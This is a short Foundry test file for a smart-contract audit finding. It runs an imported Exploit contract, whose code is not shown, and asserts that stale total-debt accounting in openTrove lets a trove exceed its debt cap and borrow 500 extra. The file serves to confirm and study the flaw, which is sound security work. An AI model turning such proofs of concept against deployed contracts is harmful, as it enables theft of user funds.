// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit} from "./55112-h-02-stale-totalactivedebt-used-in-opentrove-causing-incorre.sol";

contract Finding55112Test is Test {
    function test_stale_debt_lets_an_over_cap_trove_open() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.wrongDebt(), 1500, "recorded 1500");
        assertEq(e.FAIR_DEBT(), 1600, "fair is 1600");
        assertEq(e.borrowed(), 500, "extra borrow 500");
        assertTrue(e.fairOpenReverted(), "fresh supply blocks the open");
        emit log_named_uint("wrong debt", e.wrongDebt());
        emit log_named_uint("fair debt", e.FAIR_DEBT());
        emit log_named_uint("borrowed", e.borrowed());
    }
}
